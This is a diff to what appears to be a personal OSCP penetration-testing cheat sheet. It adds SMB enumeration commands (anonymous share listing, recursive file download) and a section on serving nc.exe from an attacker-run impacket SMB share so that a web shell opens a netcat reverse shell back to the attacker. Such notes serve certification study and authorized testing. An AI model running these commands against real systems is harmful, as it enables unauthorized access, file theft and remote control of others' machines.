@@ -17,7 +17,7 @@ $ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
 
 ### SMB/Samba [139, 445 TCP]
 
-Enumerate via. SMB.
+Automated enum.
 ```
 $ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
 ```
@@ -26,6 +26,17 @@ Check for SMB vulnerabilities.
 ```
 $ nmap --script smb-vuln-* [target]
 ```
+
+Enumerate SMB.
+```
+$ smbclient --no-pass -L //10.11.1.31         # list shares
+$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
+
+$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
+$ smbget -R smb://[host]/share                # recursively get files from target share/dir
+```
+
+
 
 ### LDAP [389,636 etc. etc.]
 
@@ -48,6 +59,15 @@ $ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ## Initial Exploitation
 
 ### Shells
+
+Web shell + SMB exec
+```
+# Setup local share e.g. python3 ../smbserver.py EVILSHARE .
+$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [localdir] 
+
+# Execute netcat reverse shell within webshell
+cmd> \\[host]\share\nc.exe [host] [port] -e cmd.exe
+```
 
 Have a web shell? Check if server can reach you:
 ```
